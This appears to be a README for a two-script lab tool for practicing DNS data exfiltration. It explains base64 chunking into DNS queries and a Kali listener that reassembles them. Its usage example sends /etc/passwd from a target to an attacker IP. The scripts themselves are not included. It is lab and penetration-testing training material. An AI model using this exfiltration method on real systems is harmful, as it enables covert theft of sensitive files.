DNS Exfiltration Lab
A simple two-script system for practicing DNS data exfiltration techniques in CTF and penetration testing environments.
Overview
Exfiltrate data from a target machine by encoding it in DNS queries. The listener captures and decodes the data automatically.
Setup
Requirements:

Kali Linux (attacker/listener)
Target VM or second machine
tcpdump, dig, base64 (pre-installed on most Linux)

Usage
1. On Kali (Listener)
bashsudo ./listener.sh
# Wait for data, then press Ctrl+C to decode
2. On Target (Exfiltration)
bash./exfil.sh
# Enter file path (e.g., /etc/passwd)
# Enter Kali IP address
3. Check Results
Decoded data saved to exfiltrated_data.txt on Kali machine.
How It Works

Target encodes file → base64
Splits into chunks → DNS queries (1.chunk.yourdomain.com)
Kali captures queries → extracts chunks
Reassembles → decodes → original file

Example
bash# Target
./exfil.sh
File: /etc/passwd
IP: 192.168.56.1

# Kali receives and decodes automatically
[+] Success! Saved to: exfiltrated_data.txt
Legal Notice
⚠️ For educational purposes only. Use only on systems you own or have explicit permission to test. Unauthorized access is illegal.
License
MIT License - Use at your own risk.
